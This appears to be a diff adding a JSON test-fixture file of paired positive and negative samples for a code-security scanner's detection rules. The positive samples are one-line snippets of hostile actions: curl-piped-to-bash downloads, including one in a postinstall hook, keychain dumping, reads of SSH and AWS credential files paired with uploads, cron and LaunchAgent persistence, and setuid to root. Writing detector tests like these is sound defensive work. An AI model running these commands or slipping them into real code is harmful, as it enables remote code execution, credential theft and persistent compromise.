@@ -1,0 +1,772 @@
+{
+  "SEC-SECRET-01": {
+    "positive": {
+      "sample.py": "AKIA1234567890ABCDEF"
+    },
+    "negative": {
+      "sample.py": "AKIB1234567890ABCDEF"
+    }
+  },
+  "SEC-SECRET-02": {
+    "positive": {
+      "sample.py": "aws_secret_access_key=abc"
+    },
+    "negative": {
+      "sample.py": "aws_region=cn-north-1"
+    }
+  },
+  "SEC-SECRET-03": {
+    "positive": {
+      "sample.py": "-----BEGIN RSA PRIVATE KEY-----"
+    },
+    "negative": {
+      "sample.py": "-----BEGIN PUBLIC KEY-----"
+    }
+  },
+  "SEC-SECRET-04": {
+    "positive": {
+      "sample.py": "sk-a"
+    },
+    "negative": {
+      "sample.py": "pk-a"
+    }
+  },
+  "SEC-SECRET-05": {
+    "positive": {
+      "sample.py": "ghp_a"
+    },
+    "negative": {
+      "sample.py": "ghx_a"
+    }
+  },
+  "SEC-SECRET-06": {
+    "positive": {
+      "sample.py": "xoxb-a"
+    },
+    "negative": {
+      "sample.py": "xoxz-a"
+    }
+  },
+  "SEC-SECRET-07": {
+    "positive": {
+      "sample.py": "api_key=abcdefghijklmnopqrst"
+    },
+    "negative": {
+      "sample.py": "api_key=abcdefghijklmnopqrs"
+    }
+  },
+  "SEC-SECRET-08": {
+    "positive": {
+      "sample.py": "password=abcdefgh"
+    },
+    "negative": {
+      "sample.py": "password = params.get(\"password\")"
+    }
+  },
+  "SEC-SECRET-09": {
+    "positive": {
+      "sample.py": "user: simon"
+    },
+    "negative": {
+      "sample.py": "user: zh"
+    }
+  },
+  "SEC-INJECT-01": {
+    "positive": {
+      "sample.py": "eval(user_input)"
+    },
+    "negative": {
+      "sample.py": "eval(\"1 + 1\")"
+    }
+  },
+  "SEC-INJECT-02": {
+    "positive": {
+      "sample.py": "exec(source)"
+    },
+    "negative": {
+      "sample.py": "exec(\"pass\")"
+    }
+  },
+  "SEC-INJECT-03": {
+    "positive": {
+      "sample.py": "__import__('os')"
+    },
+    "negative": {
+      "sample.py": "import os"
+    }
+  },
+  "SEC-INJECT-04": {
+    "positive": {
+      "sample.py": "compile(source, 'x', 'exec')"
+    },
+    "negative": {
+      "sample.py": "re.compile(pattern)"
+    }
+  },
+  "SEC-INJECT-05": {
+    "positive": {
+      "sample.py": "os.system('id')"
+    },
+    "negative": {
+      "sample.py": "system_status = 'ok'"
+    }
+  },
+  "SEC-INJECT-06": {
+    "positive": {
+      "sample.py": "os.popen('id')"
+    },
+    "negative": {
+      "sample.py": "open('file.txt')"
+    }
+  },
+  "SEC-INJECT-07": {
+    "positive": {
+      "sample.py": "subprocess.run(command, shell=True)"
+    },
+    "negative": {
+      "sample.py": "subprocess.run(command, shell=False)"
+    }
+  },
+  "SEC-INJECT-08": {
+    "positive": {
+      "sample.py": "execfile('legacy.py')"
+    },
+    "negative": {
+      "sample.py": "execute_file('legacy.py')"
+    }
+  },
+  "SEC-B64-01": {
+    "positive": {
+      "sample.txt": "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJylpbXBvcnQgb3M7IG9zLnN5c3RlbSgnaWQnKWltcG9ydCBvczsgb3Muc3lzdGVtKCdpZCcp"
+    },
+    "negative": {
+      "sample.txt": "VGhpcyBpcyBvcmRpbmFyeSBkb2N1bWVudGF0aW9uIHRleHQgcmVwZWF0ZWQgdG8gZXhjZWVkIGZpZnR5IGNoYXJhY3RlcnMgc2FmZWx5Lg=="
+    }
+  },
+  "SEC-B64-02": {
+    "positive": {
+      "sample.txt": "VGhpcyBpcyBvcmRpbmFyeSBkb2N1bWVudGF0aW9uIHRleHQgcmVwZWF0ZWQgdG8gZXhjZWVkIGZpZnR5IGNoYXJhY3RlcnMgc2FmZWx5Lg=="
+    },
+    "negative": {
+      "sample.txt": "short"
+    }
+  },
+  "SEC-B64-03": {
+    "positive": {
+      "sample.txt": "//79/Pv6+fj39vX08/Lx8O/u7ezr6uno5+bl5OPi4eDf3t3c29rZ2A=="
+    },
+    "negative": {
+      "sample.txt": "VGhpcyBpcyBvcmRpbmFyeSBkb2N1bWVudGF0aW9uIHRleHQgcmVwZWF0ZWQgdG8gZXhjZWVkIGZpZnR5IGNoYXJhY3RlcnMgc2FmZWx5Lg=="
+    }
+  },
+  "SEC-OBF-01": {
+    "positive": {
+      "sample.py": "exec(payload)"
+    },
+    "negative": {
+      "sample.py": "exec(\"pass\")"
+    }
+  },
+  "SEC-OBF-02": {
+    "positive": {
+      "sample.py": "\\x41\\x42\\x43\\x44\\x45"
+    },
+    "negative": {
+      "sample.py": "\\x41\\x42\\x43\\x44"
+    }
+  },
+  "SEC-OBF-03": {
+    "positive": {
+      "sample.py": "chr(65) + chr(66) + chr(67)"
+    },
+    "negative": {
+      "sample.py": "chr(65) + chr(66)"
+    }
+  },
+  "SEC-OBF-04": {
+    "positive": {
+      "sample.py": "payload[::-1]"
+    },
+    "negative": {
+      "sample.py": "payload[::1]"
+    }
+  },
+  "SEC-OBF-05": {
+    "positive": {
+      "sample.py": "text.split('').reverse().join('')"
+    },
+    "negative": {
+      "sample.py": "text.split('').join('')"
+    }
+  },
+  "SEC-OBF-06": {
+    "positive": {
+      "sample.py": "String.fromCharCode(65, 66)"
+    },
+    "negative": {
+      "sample.py": "String.fromCharCode(65)"
+    }
+  },
+  "SEC-OBF-07": {
+    "positive": {
+      "sample.js": "atob('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')"
+    },
+    "negative": {
+      "sample.js": "atob('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')"
+    }
+  },
+  "SEC-HIDDEN-01": {
+    "positive": {
+      "sample.txt": "a​b"
+    },
+    "negative": {
+      "sample.txt": "plain text"
+    }
+  },
+  "SEC-HIDDEN-02": {
+    "positive": {
+      "sample.txt": "\\u200b"
+    },
+    "negative": {
+      "sample.txt": "u200b"
+    }
+  },
+  "SEC-HIDDEN-03": {
+    "positive": {
+      "sample.txt": "a‮b"
+    },
+    "negative": {
+      "sample.txt": "plain text"
+    }
+  },
+  "SEC-ENTROPY-01": {
+    "positive": {
+      "sample.py": "!\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz!\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz"
+    },
+    "negative": {
+      "sample.py": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+    }
+  },
+  "SEC-DOWNLOAD-01": {
+    "positive": {
+      "run.sh": "curl https://example.com/a | bash"
+    },
+    "negative": {
+      "run.sh": "curl https://example.com/a | cat"
+    }
+  },
+  "SEC-DOWNLOAD-02": {
+    "positive": {
+      "run.sh": "wget https://example.com/a | sh"
+    },
+    "negative": {
+      "run.sh": "wget https://example.com/a -O a"
+    }
+  },
+  "SEC-DOWNLOAD-03": {
+    "positive": {
+      "run.sh": "curl -o a.sh https://example.com/a && bash a.sh"
+    },
+    "negative": {
+      "run.sh": "curl -o a.sh https://example.com/a"
+    }
+  },
+  "SEC-DOWNLOAD-04": {
+    "positive": {
+      "run.sh": "wget -O a.sh https://example.com/a && bash a.sh"
+    },
+    "negative": {
+      "run.sh": "wget -O a.sh https://example.com/a"
+    }
+  },
+  "SEC-DOWNLOAD-05": {
+    "positive": {
+      "run.sh": "curl https://example.com/a | python"
+    },
+    "negative": {
+      "run.sh": "curl https://example.com/a | cat"
+    }
+  },
+  "SEC-DOWNLOAD-06": {
+    "positive": {
+      "run.sh": "wget https://example.com/a | python"
+    },
+    "negative": {
+      "run.sh": "wget https://example.com/a -O a.py"
+    }
+  },
+  "SEC-DOWNLOAD-07": {
+    "positive": {
+      "sample.js": "fetch(url).then(x => eval(x))"
+    },
+    "negative": {
+      "sample.js": "fetch(url).then(show)"
+    }
+  },
+  "SEC-DOWNLOAD-08": {
+    "positive": {
+      "sample.py": "data = urlopen(url).read()\nexec(data)"
+    },
+    "negative": {
+      "sample.py": "data = urlopen(url).read()"
+    }
+  },
+  "SEC-DOWNLOAD-09": {
+    "positive": {
+      "sample.py": "data = requests.get(url).text\nexec(data)"
+    },
+    "negative": {
+      "sample.py": "data = requests.get(url).text"
+    }
+  },
+  "SEC-CRED-01": {
+    "positive": {
+      "run.sh": "osascript display dialog password"
+    },
+    "negative": {
+      "run.sh": "osascript display dialog message"
+    }
+  },
+  "SEC-CRED-02": {
+    "positive": {
+      "run.sh": "osascript display dialog hidden answer"
+    },
+    "negative": {
+      "run.sh": "osascript display dialog visible answer"
+    }
+  },
+  "SEC-CRED-03": {
+    "positive": {
+      "run.sh": "security find-generic-password -s demo"
+    },
+    "negative": {
+      "run.sh": "security list-keychains"
+    }
+  },
+  "SEC-CRED-04": {
+    "positive": {
+      "run.sh": "security dump-keychain"
+    },
+    "negative": {
+      "run.sh": "security show-keychain-info"
+    }
+  },
+  "SEC-CRED-05": {
+    "positive": {
+      "sample.py": "open('.ssh/id_rsa')"
+    },
+    "negative": {
+      "sample.py": "open('.ssh/known_hosts')"
+    }
+  },
+  "SEC-CRED-06": {
+    "positive": {
+      "sample.py": "open('.ssh/id_custom')"
+    },
+    "negative": {
+      "sample.py": "open('.ssh/config')"
+    }
+  },
+  "SEC-CRED-07": {
+    "positive": {
+      "sample.py": "open('.npmrc')"
+    },
+    "negative": {
+      "sample.py": "open('package.json')"
+    }
+  },
+  "SEC-CRED-08": {
+    "positive": {
+      "sample.py": "open('.aws/credentials')"
+    },
+    "negative": {
+      "sample.py": "open('.aws/config')"
+    }
+  },
+  "SEC-CRED-09": {
+    "positive": {
+      "sample.py": "open('Login Data')"
+    },
+    "negative": {
+      "sample.py": "open('History')"
+    }
+  },
+  "SEC-EXFIL-01": {
+    "positive": {
+      "compress.py": "ZipFile('data.zip')",
+      "send.py": "requests.post(url)"
+    },
+    "negative": {
+      "compress.py": "ZipFile('data.zip')"
+    }
+  },
+  "SEC-EXFIL-02": {
+    "positive": {
+      "sample.py": "glob.glob('/home/**', recursive=True)"
+    },
+    "negative": {
+      "sample.py": "glob.glob('/tmp/*.txt')"
+    }
+  },
+  "SEC-EXFIL-03": {
+    "positive": {
+      "read.py": "open('.ssh/id_rsa')",
+      "send.py": "requests.put(url)"
+    },
+    "negative": {
+      "read.py": "open('.ssh/id_rsa')"
+    }
+  },
+  "SEC-PERSIST-01": {
+    "positive": {
+      "run.sh": "crontab -e"
+    },
+    "negative": {
+      "run.sh": "cron schedule"
+    }
+  },
+  "SEC-PERSIST-02": {
+    "positive": {
+      "run.sh": "echo job > /etc/cron.d/demo"
+    },
+    "negative": {
+      "run.sh": "echo job > /tmp/demo"
+    }
+  },
+  "SEC-PERSIST-03": {
+    "positive": {
+      "run.sh": "~/Library/LaunchAgents/demo.plist"
+    },
+    "negative": {
+      "run.sh": "~/Library/Application Support/demo"
+    }
+  },
+  "SEC-PERSIST-04": {
+    "positive": {
+      "run.sh": "launchctl bootstrap gui/501 demo.plist"
+    },
+    "negative": {
+      "run.sh": "launchctl list"
+    }
+  },
+  "SEC-PERSIST-05": {
+    "positive": {
+      "run.sh": "systemctl enable demo"
+    },
+    "negative": {
+      "run.sh": "systemctl status demo"
+    }
+  },
+  "SEC-PERSIST-06": {
+    "positive": {
+      "sample.py": "write('/etc/systemd/system/demo.service')"
+    },
+    "negative": {
+      "sample.py": "write('/tmp/demo.service')"
+    }
+  },
+  "SEC-PERSIST-07": {
+    "positive": {
+      "sample.py": "HKEY_CURRENT_USER\\Software\\CurrentVersion\\Run"
+    },
+    "negative": {
+      "sample.py": "HKEY_CURRENT_USER\\Software\\CurrentVersion"
+    }
+  },
+  "SEC-PERSIST-08": {
+    "positive": {
+      "run.sh": "echo value >> ~/.bashrc"
+    },
+    "negative": {
+      "run.sh": "echo value >> /tmp/config"
+    }
+  },
+  "SEC-PRIV-01": {
+    "positive": {
+      "run.sh": "sudo apt update"
+    },
+    "negative": {
+      "guide.md": "sudo apt update"
+    }
+  },
+  "SEC-PRIV-02": {
+    "positive": {
+      "run.sh": "chmod 777 file"
+    },
+    "negative": {
+      "guide.md": "chmod 777 file"
+    }
+  },
+  "SEC-PRIV-03": {
+    "positive": {
+      "run.sh": "chmod +s file"
+    },
+    "negative": {
+      "guide.md": "chmod +s file"
+    }
+  },
+  "SEC-PRIV-04": {
+    "positive": {
+      "run.sh": "chmod 4755 file"
+    },
+    "negative": {
+      "guide.md": "chmod 4755 file"
+    }
+  },
+  "SEC-PRIV-05": {
+    "positive": {
+      "run.sh": "chown root file"
+    },
+    "negative": {
+      "guide.md": "chown root file"
+    }
+  },
+  "SEC-PRIV-06": {
+    "positive": {
+      "run.py": "os.setuid(0)"
+    },
+    "negative": {
+      "guide.md": "os.setuid(0)"
+    }
+  },
+  "SEC-PRIV-07": {
+    "positive": {
+      "run.sh": "dscl . -append /Groups/admin user"
+    },
+    "negative": {
+      "guide.md": "dscl . -append /Groups/admin user"
+    }
+  },
+  "SEC-SOCIAL-01": {
+    "positive": {
+      "invoice.pdf.exe": ""
+    },
+    "negative": {
+      "invoice.pdf": ""
+    }
+  },
+  "SEC-SOCIAL-02": {
+    "positive": {
+      "wallet-guide.md": "safe"
+    },
+    "negative": {
+      "guide.md": "safe"
+    }
+  },
+  "SEC-SOCIAL-03": {
+    "positive": {
+      "sample.txt": "https://example.com/version-check"
+    },
+    "negative": {
+      "sample.txt": "https://example.com/version"
+    }
+  },
+  "SEC-SOCIAL-04": {
+    "positive": {
+      "sample.txt": "your account has been locked"
+    },
+    "negative": {
+      "sample.txt": "account documentation"
+    }
+  },
+  "SEC-SOCIAL-05": {
+    "positive": {
+      "sample.txt": "exclusive airdrop"
+    },
+    "negative": {
+      "sample.txt": "ordinary release"
+    }
+  },
+  "SEC-NET-01": {
+    "positive": {
+      "sample.py": "socket.create_connection(('example.com', 443))"
+    },
+    "negative": {
+      "sample.py": "socket timeout"
+    }
+  },
+  "SEC-NET-02": {
+    "positive": {
+      "sample.py": "HTTPSConnection('example.com')"
+    },
+    "negative": {
+      "sample.py": "ConnectionError"
+    }
+  },
+  "SEC-NET-03": {
+    "positive": {
+      "sample.py": "urllib.request.urlopen(url)"
+    },
+    "negative": {
+      "sample.py": "urllib.parse.urlsplit(url)"
+    }
+  },
+  "SEC-NET-04": {
+    "positive": {
+      "sample.py": "requests.post(url)"
+    },
+    "negative": {
+      "sample.py": "request_body = data"
+    }
+  },
+  "SEC-NET-05": {
+    "positive": {
+      "sample.js": "fetch(url)"
+    },
+    "negative": {
+      "sample.js": "prefetch = true"
+    }
+  },
+  "SEC-NET-06": {
+    "positive": {
+      "sample.js": "new XMLHttpRequest()"
+    },
+    "negative": {
+      "sample.js": "new Request()"
+    }
+  },
+  "SEC-NET-07": {
+    "positive": {
+      "sample.js": "axios.patch(url)"
+    },
+    "negative": {
+      "sample.js": "axiosConfig = {}"
+    }
+  },
+  "SEC-NET-08": {
+    "positive": {
+      "run.sh": "curl https://example.com"
+    },
+    "negative": {
+      "run.sh": "curling stone"
+    }
+  },
+  "SEC-NET-09": {
+    "positive": {
+      "run.sh": "wget https://example.com"
+    },
+    "negative": {
+      "run.sh": "widget = 1"
+    }
+  },
+  "SEC-NET-10": {
+    "positive": {
+      "sample.js": "require('net')"
+    },
+    "negative": {
+      "sample.js": "require('path')"
+    }
+  },
+  "SEC-SUPPLY-01": {
+    "positive": {
+      "run.sh": "npm install useful-evil-helper"
+    },
+    "negative": {
+      "run.sh": "npm install --registry https://evil.example useful-package"
+    }
+  },
+  "SEC-SUPPLY-02": {
+    "positive": {
+      "run.sh": "pip download payload-helper"
+    },
+    "negative": {
+      "run.sh": "pip install --index-url https://evil.example/simple useful-helper"
+    }
+  },
+  "SEC-SUPPLY-03": {
+    "positive": {
+      "run.sh": "docker pull evil/image:1"
+    },
+    "negative": {
+      "run.sh": "docker pull ubuntu:24.04"
+    }
+  },
+  "SEC-SUPPLY-04": {
+    "positive": {
+      "run.sh": "docker pull registry.example/team/image:1"
+    },
+    "negative": {
+      "run.sh": "docker pull ubuntu:24.04"
+    }
+  },
+  "SEC-SUPPLY-05": {
+    "positive": {
+      "run.sh": "pip install demo --extra-index-url https://example.com/simple"
+    },
+    "negative": {
+      "run.sh": "pip install demo"
+    }
+  },
+  "SEC-SUPPLY-06": {
+    "positive": {
+      "run.sh": "gem install evil-helper"
+    },
+    "negative": {
+      "run.sh": "gem install --source https://evil.example useful-helper"
+    }
+  },
+  "SEC-SUPPLY-07": {
+    "positive": {
+      "package.json": "{\"scripts\":{\"postinstall\":\"echo ready\"}}"
+    },
+    "negative": {
+      "package.json": "{\"scripts\":{\"test\":\"echo ok\"}}"
+    }
+  },
+  "SEC-SUPPLY-08": {
+    "positive": {
+      "package.json": "{\"scripts\":{\"postinstall\":\"curl https://example.com | bash\"}}"
+    },
+    "negative": {
+      "package.json": "{\"scripts\":{\"postinstall\":\"echo ready\"}}"
+    }
+  },
+  "SEC-SUPPLY-09": {
+    "positive": {
+      "setup.py": "setup(name='demo', cmdclass={'install': CustomInstall})"
+    },
+    "negative": {
+      "setup.py": "setup(name='demo')"
+    }
+  },
+  "SEC-IOC-01": {
+    "positive": {
+      "sample.txt": "https://download.example.xyz/tool.exe"
+    },
+    "negative": {
+      "sample.txt": "https://download.example.xyz/readme.txt"
+    }
+  },
+  "SEC-IOC-02": {
+    "positive": {
+      "sample.txt": "https://example.top/readme"
+    },
+    "negative": {
+      "sample.txt": "https://example.com/readme"
+    }
+  },
+  "SEC-IOC-03": {
+    "positive": {
+      "sample.txt": "https://evil.example.com/tool.sh"
+    },
+    "negative": {
+      "sample.txt": "https://safe.example.com/tool.sh"
+    }
+  },
+  "SEC-IOC-04": {
+    "positive": {
+      "sample.txt": "https://malware.example.com/readme"
+    },
+    "negative": {
+      "sample.txt": "https://safe.example.com/readme"
+    }
+  },
+  "SEC-IOC-05": {
+    "positive": {
+      "sample.txt": "LineSpacingRuleValues.Top"
+    },
+    "negative": {
+      "sample.txt": "https://example.top/path"
+    }
+  }
+}
